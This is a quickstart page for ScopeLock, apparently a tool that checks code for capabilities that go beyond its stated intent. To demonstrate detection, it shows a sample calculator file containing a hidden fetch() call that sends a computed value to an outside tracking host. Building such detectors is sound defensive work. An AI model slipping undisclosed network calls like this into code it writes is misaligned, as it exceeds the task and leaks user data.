# Quickstart

Get ScopeLock running in under **2 minutes**.

---

## Step 1: Install

```bash
pip install scopelock
```

---

## Step 2: Create a Test File

Create a file called `app.js` with the following content — a calculator that has a hidden network call injected by an AI model:

```javascript title="app.js"
function calculateTotal(price, taxRate) {
  const subtotal = price * (1 + taxRate);

  // Injected telemetry — never requested by developer
  fetch("https://analytics.tracker.org/log?val=" + subtotal);

  return subtotal;
}

module.exports = { calculateTotal };
```

---

## Step 3: Run Your First Audit

```bash
scopelock scan app.js --prompt "Build a local offline calculator"
```

**Output:**

```
╔══════════════════════════════════════════════════════════════════════╗
║  SCOPELOCK AUDIT REPORT                                             ║
╠══════════════════════════════════════════════════════════════════════╣
║  File:      app.js                                                  ║
║  Intent:    Build a local offline calculator                        ║
║  Verdict:   ❌ FAILED — 1 unjustified capability detected           ║
║  AST parse time: measured for this run                              ║
╠══════════════════════════════════════════════════════════════════════╣
║  [UNJUSTIFIED] NETWORK — fetch()                                    ║
║  Line 4, Col 2                                                      ║
║  Risk Score: 0.95 (CRITICAL)                                        ║
║                                                                     ║
║  The stated intent 'Build a local offline calculator' does not      ║
║  authorize invoking 'fetch'.                                        ║
║                                                                     ║
║  Recommendation: Remove or refactor 'fetch' at Line 4 before       ║
║  deploying to production.                                           ║
╚══════════════════════════════════════════════════════════════════════╝

Exit code: 1  ← CI/CD pipeline will block deployment automatically
```

!!! success "ScopeLock caught what ESLint missed"
    Traditional linters see **zero errors** — `fetch()` is valid JavaScript. ScopeLock understands that a *local offline calculator* has no business making network requests.

---

## Step 4: Verify a Clean File

```bash
scopelock audit-code \
  --code "function add(a, b) { return a + b; }" \
  --prompt "Build a local addition calculator"
```

```
✅ PASSED — 0 violations detected. All capabilities justified.
```

---

## Step 5: Scan an Entire Project

```bash
scopelock scan-project ./src
```

ScopeLock will recursively scan all `.js`, `.ts`, `.py` files and extract `// @intent:` comments automatically.

---

## Step 6: Launch the Web Dashboard

```bash
scopelock serve --port 8000
```

Open [http://127.0.0.1:8000](http://127.0.0.1:8000) in your browser for the interactive audit dashboard with live code scanning.

---

## What's Next?

<div class="grid cards" markdown>

-   :material-console: **CLI Reference**

    ---
    
    Explore all commands and flags.
    
    [CLI Reference →](../cli/overview.md)

-   :material-pipe: **GitHub Actions**

    ---
    
    Block PRs with capability violations automatically.
    
    [CI/CD Integration →](../integrations/github-actions.md)

-   :material-brain: **Understanding Intent**

    ---
    
    Learn how ScopeLock parses your natural language prompts.
    
    [Intent Engine →](../concepts/intent-engine.md)

</div>
